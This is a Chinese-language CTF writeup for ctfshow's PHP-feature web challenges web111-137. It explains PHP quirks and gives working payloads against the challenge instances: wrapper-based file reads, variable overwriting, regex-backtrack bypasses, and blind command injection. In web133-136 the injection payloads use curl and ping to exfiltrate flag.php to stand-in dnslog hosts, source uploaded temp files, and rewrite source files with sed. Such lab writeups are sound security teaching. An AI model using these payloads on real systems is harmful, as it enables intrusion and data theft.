---
title: "ctfshow Web入门[PHP特性] web111-137 Writeup"
date: 2022-08-12T18:48:13+08:00
draft: false
author: "X1r0z"

tags: ['php', 'ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

变量覆盖, 无回显命令执行, 相关函数的绕过...

<!--more-->

## web111

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121905634.png)

hint 提示考察全局变量 (其实是超全局变量 `$GLOBALS`)

[https://www.php.net/manual/zh/reserved.variables.globals](https://www.php.net/manual/zh/reserved.variables.globals)

> $GLOBALS — 引用全局作用域中可用的全部变量

在 PHP 中, 被定义在函数外部的变量, 拥有全局作用域, 被称作全局变量

如果要想在函数内部使用全局变量, 必须通过 `global $var` 来显式引用或者是通过超全局变量数组 `$GLOBALS['var']` 来访问

`$GLOBALS` 数组存储着文件中所有的全局变量 (包含 include 进来的全局变量)

看一个例子

```php
<?php
$flag = 'flagishere';

function getFlag(){
    var_dump($GLOBALS);
}

getFlag();
?>
```

输出

```php
array(6) { ["_GET"]=> array(0) { } ["_POST"]=> array(0) { } ["_COOKIE"]=> array(0) { } ["_FILES"]=> array(0) { } ["GLOBALS"]=> array(6) { ["_GET"]=> array(0) { } ["_POST"]=> array(0) { } ["_COOKIE"]=> array(0) { } ["_FILES"]=> array(0) { } ["GLOBALS"]=> *RECURSION* ["flag"]=> string(10) "flagishere" } ["flag"]=> string(10) "flagishere" }
```

题目中很明显的有 `include("flag.php");`, 而且 `eval()` 相关操作是在 `getFlag()` 内进行的

那么我们可以猜测 flag.php 中存在这诸如 `$flag="xxx"` 的定义, 但我们不知道变量名具体是什么, 而定义的这些变量, 相对于 `getFlag()` 来说是全局变量

通过变量覆盖输出 `$GLOBALS` 的内容

```
http://719821e6-a9d2-4195-918c-695b9b28f06c.challenge.ctf.show/?v1=ctfshow&v2=GLOBALS
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208102215021.png)

得到 flag

## web112

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208111936411.png)

`highlight_file()` 支持伪协议

```
http://d47140fa-230a-4c3f-bfd4-e45c675ad041.challenge.ctf.show/?file=php://filter/resource=flag.php
```

得到 flag

hint 里面除了 `php://filter` 还有一个 `compress.zlib://flag.php`

[https://www.php.net/manual/zh/wrappers.php](https://www.php.net/manual/zh/wrappers.php)

其中的压缩流

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208111940617.png)

本地测试下来只有 `compress.zlib://` 可以**直接**读任意文件 (或者文件包含), 不知道为什么...

## web113

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208111950230.png)

filter 被过滤了, 测试了 php://input 发现并不能执行命令

不过可以通过上一题学到的 `compress.zlib://` 读取文件

```
http://5f60bee4-67bc-4087-a932-f56f64262afc.challenge.ctf.show/?file=compress.zlib://flag.php
```

hint 给出的 payload

```
/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
lf/root/proc/self/root/var/www/html/flag.php
```

 `is_file()` 目录溢出漏洞, 大概意思就是通过多级嵌套绕过检测

这里的 `/proc/self/root` 是一个指向 `/` 的软连接

参考文章 [https://www.anquanke.com/post/id/213235](https://www.anquanke.com/post/id/213235)

## web114

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112014916.png)

上一题的目录溢出被过滤了, 但是 php://filter 还能用

```
http://a3fe147e-1371-48fa-929c-f6e3c9590639.challenge.ctf.show/?file=php://filter/resource=flag.php
```

感觉考察点应该是这里的 `is_file()` 支持读取伪协议

## web115

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112017623.png)

`is_numeric()` 的相关比较

```php
<?php

is_numeric(' 36'); // true
is_numeric('36 '); // false
is_numeric('3 6'); // false

is_numeric("\n36"); // true
is_numeric("\t36"); // true

is_numeric("36\n"); // false
is_numeric("36\t"); // false
?>
```

可以看到我们在数字开头加入一些特殊字符可以绕过 `is_numeric()` 返回 true

在数字中间和末尾加就没有这个效果

而源码中的 `!==` 和 `===` 一样是强类型比较

```php
' 36'=='36'; // true
'36 '=='36'; // false
'3 6'=='36'; // false

"\n36"=="36"; // true
"\t36"=="36"; // true

"36\n"=="36"; // false
"36\t"=="36"; // false

" 36" === "36" // false
"36 " === "36" // false

"\n36"==="36"; // false
"\t36"==="36"; // false
```

对于 `===` 的强类型比较, 但凡比较的字符串有一点点的不一样 (空格 tab 换行符等), 就返回 false

这样子我们可以绕过前两个比较, 即 `is_numeric($num) and $num !== '36'`

`filter()` 没有对上面提到的特殊字符进行处理, 只是过滤了十六进制, 八进制这些利用进制转换和科学计数法的 tricks

但问题是这里的 `trim()` 会去除空格和 tab 等字符

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112050562.png)

我们需要找到一个不能够被 `trim()` 去除的字符

fuzz 一下 ASCII 0-31 字符

```python
import requests
from urllib.parse import unquote

url = 'http://c26198d2-57c2-4252-bdac-4df1ada2df20.challenge.ctf.show/?num='

for i in range(32):
    if i < 16:
        s = '0' + str(hex(i).replace('0x', ''))
    else:
        s = str(hex(i).replace('0x', ''))
    payload = '%' + s + '36'
    res = requests.get(url + unquote(payload))
    if 'ctfshow' in res.text:
        print(payload)
```

最终的 payload 是 `%0c36`, 即 `\f36`, 其中 `\f` 是换页符 (我也不知道具体是啥...)

```
http://c26198d2-57c2-4252-bdac-4df1ada2df20.challenge.ctf.show/?num=%0c36
```

## web123

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112121392.png)

考察变量覆盖, 需要通过 eval 构造出 `$fl0g` 这个变量, 而且不能赋值

没有过滤 `()` `_` `$`, 猜测是通过函数来实现

变量覆盖的相关函数

```php
extract()
parse_str()
import_request_variables()
```

这里使用 `extract()`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112211341.png)

不过一直没有显示 flag...

本地测试了一下, 发现 `.` 被转义成 `_` 了

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112212363.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112230520.png)

hint 如下

```
POST: CTF_SHOW=&CTF[SHOW.COM=&fun=echo $flag
```

测试发现 `[` 被转换成 `_`, 而后面的 `.` 没有被转换

Google 找了好久的参考文章 [https://blog.csdn.net/mochu7777777/article/details/115050295](https://blog.csdn.net/mochu7777777/article/details/115050295)

当 PHP 版本小于8时有效

换了 payload 之后得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112229174.png)

其实 eval 里面直接 `echo $flag` 也行

或者用 `var_export(get_defined_vars())` 导出已定义变量

## web125

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112232912.png)

直接 echo 不行了

变量覆盖或者导出已定义变量

hint 是 `highlight_file($_GET[1])` 读取文件, 毕竟 eval 很灵活

## web126

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112236589.png)

过滤了几个字母

常规的变量覆盖使用 `$_GET` `$_POST` `$_COOKIE` 都不行了

注意到这里有一个变量 `$a=$_SERVER['argv']`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112257791.png)

`$_SERVER['argv']` 与 `$_SERVER['QUERY_STRING']` 不同的是前者是数组, 而后者是一整个字符串

`$_SERVER['argv']` 数组里面的每一项在 GET 传参中以空格分隔 (url 编码以后就是加号)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112258921.png)

注意这两个变量的值都会进行 url 编码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112300111.png)

第一种方法是变量覆盖

直接 `parse_str($a[0])` 肯定不行, 因为存在 `!isset($_GET['fl0g'])` 这一句

但是因为 `$a` 是数组, 可以利用 argv 传参和 get 传参的差异得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112306415.png)

第二种方法是代码执行

但是引号被过滤了, 就算能绕过也会被 url 编码, 怎么办?

考察以下代码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112308304.png)

虽然爆了 warning 但是能正常返回一个字符串

测试了下直接 `fun=$a[0]` 不行, 必须得再内嵌一个 eval 或者 assert

assert 不用加分号, eval 必须加分号

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112310744.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112310685.png)

## web127

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208112315704.png)

变量覆盖, 过滤了一堆字符

根据上文 PHP 不能加引号也能正常赋值字符串以及把变量名/索引名中不合法的字符替换成 `_` 的特性

payload 如下

```
http://129e4f7d-aa4e-478a-862b-cba24942b739.challenge.ctf.show/?ctf%20show=ilove36d
```

## web128

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121133645.png)

`call_user_func()` 第一个参数是被调用的回调函数, 其余的参数是回调函数的参数

回调函数名不能含有字母和数字, emmm

hint 提示 `_()` 是 `gettext()` 的别名

参考文章

[https://www.php.net/manual/zh/function.gettext](https://www.php.net/manual/zh/function.gettext)

[https://www.cnblogs.com/lost-1987/articles/3309693.html](https://www.cnblogs.com/lost-1987/articles/3309693.html)

`gettext()` 用于实现输出的国际化, 在不同区域输出不同语言的内容

本地测试时需要开启 `php_gettext` 扩展

第一层 `call_user_func("_", "xx")` 返回 xx 字符串, 然后被当作回调函数名被第二个 `call_user_func()` 调用

也就是说我们最终利用的函数不能含有参数, 而且必须是一步到位的

因为 flag 定义在变量里, 通过 `get_defined_vars()` 导出变量

```
http://1feb998c-e8d7-4715-800d-92b9dac32473.challenge.ctf.show/?f1=_&f2=get_defined_vars
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121150718.png)

## web129

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121152542.png)

`stripos()` 查找字符串首次出现的位置 (不区分大小写)

data:// 伪协议用不了, php 相关的没想到怎么构造

换个思路, 类似之前强网杯遇到的目录穿越, 构造一个不存在的目录然后 `..`

```
http://5b4335ed-dcba-459c-911e-08766ee4ca09.challenge.ctf.show/?f=./ctfshow/../flag.php
```

注意 `ctfshow` 不能在第一位, 否则的话 `stripos()` 的结果是0

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121429180.png)

hint 的方法如下

```
/ctfshow/../../../../var/www/html/flag.php
```

网上搜了一下发现 php://filter 其实能用

```php
php://filter/ctfshow/resource=flag.php
```

## web130

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121433058.png)

正则可视化 [https://jex.im/regulex/#!flags=&re=.+?ctfshow](https://jex.im/regulex/#!flags=&re=.%2B%3Fctfshow)

模式修饰符 [https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php](https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php)

`/s` 使 `.` 匹配所有字符, 包含换行符

post 传递 ctfshow 直接就出来了...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121440694.png)

在 wp 上看到了其它几种方法

通过数组绕过

```
f=ctfshow[]

f[]=123
```

第一个原因的其实是正则并未匹配 ctfshow 后面有什么字符, 所以类似 `ctfshow123` 也是能够绕过正则的检测, 后面匹配到了在第一位的 ctfshow, `stripos()` 返回0, `0 === false` 返回 false, 绕过了 `die()`

第二个的原因是 `preg_match()` 遇到数组会返回 false, `stripos()` 遇到数组会返回 NULL, `NULL === false` 返回 false

## web131

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121457261.png)

正则跟上一题的一模一样

强制转换成 String 类型, 而且 ctfshow 前面加上了 36D, 上一题的方法不管用了

hint 提示是正则表达式溢出

参考文章 [https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

回溯失败时会返回 false

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121529719.png)

ctrl + v 多按一会

这个漏洞的修复方法是使用 `===` 与返回值作比较, 例如

```php
if (preg_match('xxx', 'yyy') === 0) {
	// ...
}
```

`0 === false` 返回 false

## web132

打开后是个网页

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121533614.png)

robots.txt

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121535053.png)

访问后得到源码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121536681.png)

0x36D 是 877

`mt_rand(1, 0x36D)` 返回 1-877 之间的随机数, 而且是自动播种, 应该没有伪随机数的问题

if 后面有 `&&` 和 `||`, 猜测考察运算符的优先级

查阅 PHP 手册得知, `&&` 的优先级高于 `||`

所以其实是

```php
($code === mt_rand(1,0x36D) && $password === $flag) || $username ==="admin"
```

整个条件只要 `$username == "admin"` 为 true 即可, 不用关心 code 和 password 的值

payload

```
http://816e0a09-0504-4163-a4e8-b9942f602259.challenge.ctf.show/admin/?username=admin&password=123&code=admin
```

直接得到 flag

## web133

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121547104.png)

不会了..

hint 提示 [https://blog.csdn.net/qq_46091464/article/details/109095382](https://blog.csdn.net/qq_46091464/article/details/109095382)

类似于变量覆盖, 原理跟 `"$var"` 一样, 反引号内也能够引用变量

测试 payload

```bash
`$F`; sleep 3
```

注意分号后面的空格, 如果没有这个空格, 那么 `substr()` 截断后的语句就是这样的

```bash
`$F`;s
```

eval 之后会报错

知道这个 tricks 之后, 剩下的就可以当作无回显的命令执行

cp mv 测试失败, 估计是限制了权限

尝试用 dnslog 回显

```bash
`$F`; curl http://xxx.ceye.io/`cat flag.php | base64`
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121657324.png)

解码失败, 有长度限制

用 grep 查找 ctfshow 关键字

```bash
`$F`; curl http://xxx.ceye.io/`cat flag.php | grep ctfshow | base64`
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121659716.png)

得到 flag

wp 里面是通过 `curl -F` + brup collaborator 的形式

`-F` 为以带文件的形式发送 post 请求, 可以认为没有长度限制

```bash
`$F`; curl -X POST -F xx=@flag.php http://xxx.oastify.com
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121702311.png)

## web134

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121709075.png)

变量覆盖

当时想着是通过 `$_POST=$_COOKIE`, 然后 Cookie 处写变量

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121727643.png)

结果发现执行失败

查了手册才知道 `=` 后面的已经算是字符串了, 例如

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121728947.png)

换个思路, 根据上面的例子可知, `parse_str()` 是接受数组传参的

```
?_POST['key1']=36d&_POST['key2']=36d
```

测试失败, 想了想可能是因为 `parse_str()` 已经默认将值和索引解析成字符串了, 不需要再加引号

```
?_POST[key1]=36d&_POST[key2]=36d
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121729145.png)

## web135

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121732095.png)

过滤了 curl wget 等函数, bash sh 也过滤了

想到了利用 `.` 执行文件的方法 (无需 x 权限)

利用 PHP 上传时保存在 `/tmp/php[六位大小写字母]` 的缓存文件执行命令

```bash
`$F`; . /tmp/php*
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121743166.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121744387.png)

hint 如下

```bash
`$F`; ping `cat flag.php|awk 'NR==2'`.xxx.dnslog.cn
# 通过 ping 命令去带出数据, 然后 awk NR 一排一排的获得数据
```

后来发现这题直接 mv cp 也能做...

```bash
`$F`; mv flag.php aaa.txt
```

## web136

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121750817.png)

无回显命令执行, 过滤了很多...

hint 提示如下

```
ls /|tee 1
cat /f149_15_h3r3|tee 2
```

tee 参考文章  [https://zhuanlan.zhihu.com/p/34510815](https://zhuanlan.zhihu.com/p/34510815)

根目录内容

```
bin
dev
etc
f149_15_h3r3
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

其它 wp 的另一种 payload

```
c=ls |xargs sed -i 's/die/echo/'
c=ls |xargs sed -i 's/exec/system/'
c=cat /f149_15_h3r3
```

## web137

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121813430.png)

静态方法

[https://www.php.net/manual/zh/language.oop5.static.php](https://www.php.net/manual/zh/language.oop5.static.php)

通过范围解析操作符 `::` 访问

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208121816456.png)